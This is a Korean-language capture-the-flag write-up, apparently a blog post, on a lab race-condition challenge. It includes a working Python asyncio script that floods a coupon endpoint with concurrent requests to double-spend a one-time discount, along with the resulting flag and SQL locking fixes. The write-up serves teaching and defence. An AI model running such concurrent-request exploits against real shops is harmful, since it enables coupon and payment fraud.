+++
title = "VulnABLE CTF [LUXORA] Write-up: Race Condition 🥉 Bronze"
date = "2026-03-14"
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "Race Condition", "Bronze", "Double Spending", "Write-up"]
+++

# VulnABLE CTF [LUXORA] Write-up: Race Condition 🥉 Bronze

## 🎯 챌린지 개요
- **카테고리**: Server-Side Layer (Race Condition)
- **난이도**: 🥉 Bronze
- **타겟 경로**: `/race/bronze`
- **목표**: 1인당 딱 한 번만 사용할 수 있는 10달러 할인 쿠폰을, 동시성 통제(Concurrency Control)가 없는 환경에서 수십 개의 요청을 동시에 퍼부어 중복 사용(Double Spending)하라.

---

## 🕵️‍♂️ 1. 정보 수집 및 시스템 동작 분석 (Reconnaissance)

`/race/bronze` 장바구니(Cart) 페이지에서 'Apply Coupon(쿠폰 적용)' 버튼을 눌러봅니다.

**[정상적인 쿠폰 사용 요청]**
```http
POST /race/bronze/apply-coupon HTTP/1.1
Content-Type: application/x-www-form-urlencoded

coupon_code=WELCOME10
```

**[서버의 첫 번째 응답]**
```json
{
  "status": "success",
  "message": "$10 discount applied.",
  "cart_total": 90
}
```

한 번 더 같은 요청을 보내봅니다.
**[서버의 두 번째 응답]**
```json
{
  "status": "error",
  "message": "Coupon already used."
}
```

**[해커의 사고 과정]**
1. 쿠폰 사용 내역을 DB에 저장하고, 다음 요청 때 그 기록을 보고 막는 정상적인 로직이다.
2. 하지만 DB에서 "이 유저가 쿠폰을 썼나?" 하고 조회(Check)하는 시점과, "쿠폰을 썼음" 이라고 기록(Use)하는 시점 사이에는 분명히 시간 차이(Time Gap)가 존재한다.
3. 이 틈을 타서 수십 개의 HTTP 요청을 1 밀리초의 오차도 없이 동시에(Parallely) 날린다면?
4. 서버의 여러 스레드(Thread)가 동시에 DB를 조회하고, 모두 "아직 안 썼네!" 라고 착각하여 할인을 중복으로 적용해 줄 것이다!

---

## 💥 2. 취약점 식별 및 공격 설계 (Exploitation)

### 📊 공격 흐름도 (Attack Flow)

```text
[ Attacker ] --(Thread 1: Use Coupon)--> [ Web Server ] --(Check DB)--> Valid
[ Attacker ] --(Thread 2: Use Coupon)--> [ Web Server ] --(Check DB)--> Valid
                                         |-- Both Apply Discount!
```


이른바 **Time-Of-Check to Time-Of-Use (TOCTOU)** 기반의 Race Condition 입니다.

### 💡 파이썬 `asyncio` 기반 폭격 스크립트 작성
Race Condition은 속도전입니다. Burp Suite의 Turbo Intruder를 쓰거나 파이썬 비동기 코드를 짜서 수십 개의 요청을 일제히 보냅니다.

```python
import asyncio
import aiohttp

url = "http://localhost:3000/race/bronze/apply-coupon"
headers = {"Cookie": "session_id=user_token", "Content-Type": "application/x-www-form-urlencoded"}
data = "coupon_code=WELCOME10"

async def send_req(session):
    async with session.post(url, headers=headers, data=data) as response:
        return await response.text()

async def main():
    print("[*] Launching Race Condition Attack...")
    async with aiohttp.ClientSession() as session:
        # 50개의 요청을 동시에 준비
        tasks = [send_req(session) for _ in range(50)]
        
        # 일제히 발사 (Gather)
        results = await asyncio.gather(*tasks)
        
        # 결과 분석
        success_count = sum(1 for r in results if "success" in r)
        print(f"[+] Total successful coupon applications: {success_count}")
        
        # 마지막 응답 출력 (잔액 확인용)
        print(results[0])

asyncio.run(main())
```

---

## 🚀 3. 공격 수행 및 결과 확인

스크립트를 실행하여 쿠폰 중복 사용을 시도합니다.

### 🔍 스크립트 실행 결과
```text
[*] Launching Race Condition Attack...
[+] Total successful coupon applications: 12
{"status":"success","message":"Discount applied!","cart_total": -20, "flag": "FLAG{RACE_🥉_COUPON_DOUBLE_SPEND_A1B2C3}"}
```

원래라면 1번만 성공하고 49번은 실패해야 정상입니다. 하지만 동시성 제어 부재로 인해 무려 12개의 스레드가 'Check' 로직을 뚫고 들어가 총 120달러의 할인을 중복으로 먹였습니다! (결제 금액이 마이너스가 되었습니다.)

---

## 🚩 4. 롸잇업 결론 및 플래그

멀티 스레딩/비동기 서버 환경에서 흔히 발생하는 논리적 동시성 결함을 이용하여, 1회용 티켓/쿠폰을 무한정 복사하는 이중 지불(Double Spending) 공격을 증명했습니다.

**🔥 획득한 플래그:**
`FLAG{RACE_🥉_COUPON_DOUBLE_SPEND_A1B2C3}`

### 🛡️ 취약점 원인 및 패치 방안 (Remediation)
사용자 상태를 읽고(Read) 쓰는(Write) 행위가 분리되어 있으며, 그 사이에 다른 스레드가 개입할 수 있는(Non-Atomic) 구조가 원인입니다.

* **안전한 패치 가이드 (Database Locking)**
어플리케이션 코드(Node.js의 `await`) 레벨에서는 이 문제를 막을 수 없습니다. 반드시 **데이터베이스 레벨의 트랜잭션과 락(Lock)**을 사용해야 합니다.

1. **비관적 락 (Pessimistic Lock)**
   ```sql
   -- SELECT 시 FOR UPDATE를 붙여 다른 스레드가 이 레코드를 읽지 못하게 잠금
   BEGIN TRANSACTION;
   SELECT * FROM user_coupons WHERE user_id = 1 AND coupon = 'WELCOME10' FOR UPDATE;
   
   -- (만약 이미 썼으면 ROLLBACK)
   -- 안 썼으면 아래 UPDATE 진행
   UPDATE user_coupons SET used = true WHERE user_id = 1;
   COMMIT;
   ```
2. **원자적 조건부 업데이트 (Atomic Update) - 권장**
   읽고 쓰는 과정을 한 줄의 쿼리로 합칩니다.
   ```sql
   -- used = false 일 때만 true 로 바꾸며, 이 쿼리는 DB가 알아서 직렬화(Serialize)하여 처리함
   UPDATE user_coupons SET used = true WHERE user_id = 1 AND used = false;
   ```
   이 쿼리를 실행한 후, `Affected Rows(영향받은 행)` 가 1이면 성공(할인 적용), 0이면 누군가 이미 쓴 것으로 간주하고 실패 처리합니다.